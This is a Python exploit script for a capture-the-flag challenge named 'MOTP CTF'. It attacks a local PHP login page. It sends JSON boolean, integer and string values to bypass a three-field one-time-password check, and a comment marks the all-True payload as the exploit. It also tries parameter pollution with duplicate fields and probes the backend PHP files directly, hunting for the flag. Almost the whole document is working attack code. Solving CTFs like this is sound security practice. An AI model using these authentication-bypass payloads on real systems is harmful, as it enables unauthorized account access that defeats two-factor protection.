#!/usr/bin/env python3
import requests
import json

def test_boolean_exploit():
    """Test the boolean OTP vulnerability more systematically"""
    print("Testing Boolean OTP Vulnerability")
    print("=" * 40)
    
    url = "http://localhost:8901/login.php"
    
    # The key insight: Boolean True converted to string might be "1"
    # And boolean False might be "" (empty string)
    # Let's test different boolean combinations
    
    test_cases = [
        # the first one is the exploit
        {
            "name": "All True",
            "data": {
                "username": "admin",
                "password": "admin",
                "otp1": True,
                "otp2": True, 
                "otp3": True
            }
        },
        {
            "name": "All False",
            "data": {
                "username": "admin",
                "password": "admin",
                "otp1": False,
                "otp2": False,
                "otp3": False
            }
        },
        {
            "name": "Mixed boolean 1",
            "data": {
                "username": "admin", 
                "password": "admin",
                "otp1": True,
                "otp2": False,
                "otp3": True
            }
        },
        {
            "name": "String '1' values",
            "data": {
                "username": "admin",
                "password": "admin", 
                "otp1": "1",
                "otp2": "1",
                "otp3": "1"
            }
        },
        {
            "name": "String 'true' values",
            "data": {
                "username": "admin",
                "password": "admin",
                "otp1": "true", 
                "otp2": "true",
                "otp3": "true"
            }
        },
        {
            "name": "Integer 1 values",
            "data": {
                "username": "admin",
                "password": "admin",
                "otp1": 1,
                "otp2": 1, 
                "otp3": 1
            }
        },
        {
            "name": "Integer 0 values",
            "data": {
                "username": "admin",
                "password": "admin",
                "otp1": 0,
                "otp2": 0,
                "otp3": 0
            }
        }
    ]
    
    for test_case in test_cases:
        print(f"\nTesting: {test_case['name']}")
        try:
            response = requests.post(url, json=test_case['data'])
            result = response.json()
            print(f"Response: {result}")
            
            if "flag" in str(result).lower():
                print("🚩 FLAG FOUND!")
                return True
                
            # Check which OTP failed
            if "error" in result:
                error_msg = result["error"]["message"]
                print(f"Failed at: {error_msg}")
                
        except Exception as e:
            print(f"Error: {e}")
            print(f"Raw response: {response.text[:100]}")
    
    return False

def test_parameter_pollution():
    """Test parameter pollution attacks"""
    print("\n" + "=" * 40)
    print("Testing Parameter Pollution")
    
    url = "http://localhost:8901/login.php"
    
    # What if we send multiple values for the same parameter?
    # PHP might behave unexpectedly
    
    import urllib.parse
    
    # Try sending data as form-encoded instead of JSON
    # This allows duplicate parameter names
    
    form_data = "username=admin&password=admin&otp1=123456&otp1=&otp2=123456&otp3=123456"
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        response = requests.post(url, data=form_data, headers=headers)
        print(f"Form data response: {response.text[:200]}")
        
        if "flag" in response.text.lower():
            print("🚩 FLAG FOUND!")
            return True
            
    except Exception as e:
        print(f"Form data error: {e}")
    
    return False

def test_direct_file_access():
    """Test accessing PHP files directly to see their behavior"""
    print("\n" + "=" * 40)
    print("Testing Direct File Access")
    
    files = [
        "/google2fa.php",
        "/jsonhandler.php"
    ]
    
    for file_path in files:
        url = f"http://localhost:8901{file_path}"
        
        # Try GET request
        print(f"\nGET {file_path}:")
        try:
            response = requests.get(url)
            print(f"Status: {response.status_code}")
            print(f"Headers: {dict(response.headers)}")
            print(f"Content: '{response.text}'")
        except Exception as e:
            print(f"Error: {e}")
        
        # Try POST request
        print(f"POST {file_path}:")
        try:
            response = requests.post(url, json={"test": "data"})
            print(f"Status: {response.status_code}")
            print(f"Content: '{response.text}'")
            
            if "flag" in response.text.lower():
                print("🚩 FLAG FOUND!")
                return True
                
        except Exception as e:
            print(f"Error: {e}")
    
    return False

def main():
    print("MOTP CTF - Advanced Exploitation")
    print("=" * 50)
    
    if test_boolean_exploit():
        return
    
    if test_parameter_pollution():
        return
        
    if test_direct_file_access():
        return
    
    print("\n" + "=" * 50)
    print("Still searching for the vulnerability...")
    print("The 'mistake off the page' might be something we haven't considered yet.")

if __name__ == "__main__":
    main()
